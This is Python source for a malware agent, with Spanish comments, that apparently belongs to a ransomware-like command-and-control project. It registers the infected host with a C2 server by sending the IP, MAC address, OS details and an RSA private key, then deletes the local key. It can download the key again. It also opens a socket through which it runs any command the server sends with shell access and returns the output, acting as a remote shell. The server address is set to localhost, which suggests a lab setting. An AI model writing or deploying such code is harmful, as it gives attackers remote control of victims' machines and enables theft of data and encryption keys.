import requests
import socket
import os
import json
import platform
import antianalysis
import subprocess

SERVER_IP = "127.0.0.1"
HTTP_PORT = 5000
SOCKET_PORT = 5001
BASE_C2_URL = f"http://{SERVER_IP}:{HTTP_PORT}"

def get_ip_address():
    ip = socket.gethostbyname(socket.gethostname())
    return ip

def load_private_key():
    try:
        with open("rsa_private.pem", 'rb') as f:
            private_key = f.read()
        return private_key
    except FileNotFoundError:
        print("El archivo de clave privada no fue encontrado.")
        return None

def set_agent_id(id): # Establecer el agent_id en un archivo JSON
    with open("agent_id.json", "w") as file:
        json.dump({"agent_id": id}, file)

def get_agent_id(): # Obtener el agent_id desde el archivo JSON
    try:
        with open("agent_id.json", "r") as file:
            data = json.load(file)
            return data.get("agent_id")
    except (FileNotFoundError, json.JSONDecodeError):
        return None

def register_agent():
    ip = get_ip_address() # Obtener IP  
    mac = antianalysis.get_mac_address() # Obtener MAC 
    so = platform.system() + " " + platform.version() # Obtener S.O y versión 
    private_key = load_private_key() # Cargar clave privada
    # URL para registrar agente en C2
    server_url = f"{BASE_C2_URL}/register_agent" 
    # Datos a enviar al servidor
    data = {
        'ip': ip,
        'mac': mac,
        'so': so 
    }
    # Datos a enviar al servidor
    files = {
        'private_key': ('rsa_private.pem', private_key, 'application/x-pem-file')
    }
    # Solicitud POST para registrar agente en C2
    response = requests.post(server_url, data=data, files=files) 
    # Si la solicitud fue exitosa (código 200), procesa la respuesta   
    if response.status_code == 200:
        response_json = response.json() # Obtiene la respuesta en formato JSON
        agent_id = response_json.get('agent_id') # Extrae el agent ID de la respuesta
        set_agent_id(agent_id)  # Guardar el agent ID en JSON 
        print(f"Agente registrado con éxito. ID: {agent_id}")
        # Se elimina la clave privada después de transmitirla correctamente al servidor
        os.remove("rsa_private.pem")  
    else:
        print(f"Error al registrar el agente: {response.text}")
        return None

def get_private_key():
    agent_id = get_agent_id()
    if agent_id is None:
        print("No se ha registrado un agente. No se puede obtener la clave privada.")
        return None
    server_url = f"{BASE_C2_URL}/download_private_key/{agent_id}"
    response = requests.get(server_url)
    if response.status_code == 200:
        with open('rsa_private.pem', 'wb') as f:
            f.write(response.content)
        print("Clave privada descargada con éxito.")
    else:
        print(f"Error al descargar la clave privada: {response.text}")

    # Función para conectar el agente al servidor de sockets
def connect_to_c2_server():
    agent_id = get_agent_id()  # Obtener el ID antes de conectarse
    if agent_id is None:
        print("Error: No se encontró el ID del agente.")
        return  
    try:
        agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        agent_socket.connect((SERVER_IP, SOCKET_PORT))
        print(f"Agente {agent_id} conectado al servidor.")
        agent_socket.send(str(agent_id).encode('utf-8')) # Enviar el ID del agente al servidor

        while True:
            command = agent_socket.recv(1024).decode('utf-8')
            if command.lower() == "exit":
                break
            if command:
                if command.split(" ")[0] == 'cd': # Cambiar de directorio de trabajo
                    try:
                        os.chdir(" ".join(command.split(" ")[1:]))
                        output = "Ruta actual: {}".format(os.getcwd())
                    except FileNotFoundError:
                        output = "Error: Directorio no encontrado."
                    except Exception as e:
                        output = f"Error al cambiar de directorio: {e}"
                else:
                    # Ejecutar el comando y obtener el resultado
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    if result.stdout: # Si el comando produjo salida, enviarla
                        output = result.stdout
                    elif result.stderr:# Si el comando produjo error, enviarlo
                        output = result.stderr
                    else: # Si no hubo salida ni error, enviar un mensaje indicando que no hubo salida
                        output = "Comando ejecutado correctamente."
                agent_socket.send(output.encode('utf-8'))
        agent_socket.close()
    except Exception as e:
        print(f"Error al conectar al servidor: {e}")
